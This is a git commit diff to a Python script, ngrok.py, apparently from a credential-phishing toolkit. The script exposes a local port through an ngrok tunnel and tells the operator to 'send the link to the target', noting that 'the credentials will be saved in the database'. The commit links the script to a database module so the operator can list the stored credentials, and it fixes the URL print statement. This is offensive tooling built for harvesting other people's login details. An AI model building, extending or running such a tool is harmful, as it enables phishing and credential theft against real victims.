005f679bbf1f5650aa4471abe91234d988b8da22
leonTech254 <martinleontech23@gmail.com>
2023-10-07 17:25:02 +0300

    --link the script with the dbAdmin

--- ng/ngrok.py
+++ ng/ngrok.py
@@ -3,7 +3,14 @@ import sys
 import os
 import time
 import argparse
-from Asessts.assets import io,colors
+sys.path.append("../Asessts")
+sys.path.append("../db")
+
+from assets import io, colors
+from databaseAdmin import dbAdmin
+
+
+
 parser= argparse.ArgumentParser()
 parser.add_argument('-p', '--port', type=int, required=True, help='Port number')  
 parser.add_argument('-a', '--auth', type=str, required=True, help='Auth token')
@@ -22,9 +29,11 @@ config = ngrok.get_default_config(ngrok_version='v3')
 config['ngrok_path'] = ngrok_path
 
 public_url = ngrok.connect(port)
-io.output(info=f"[!] url: public_url",color=colors.green)
+io.output(info=f"[!] url: {public_url}",color=colors.green)
 io.output(info="All set successfully send the link to the target",color=colors.red)
-io.output(info="The credentials will be save in the database click\n 1.to open the database")
+io.output(info="The credentials will be saved in the database \n 1.to open the database",color=colors.green)
+dbAdmin.list_tables()
+
 
 
 try:
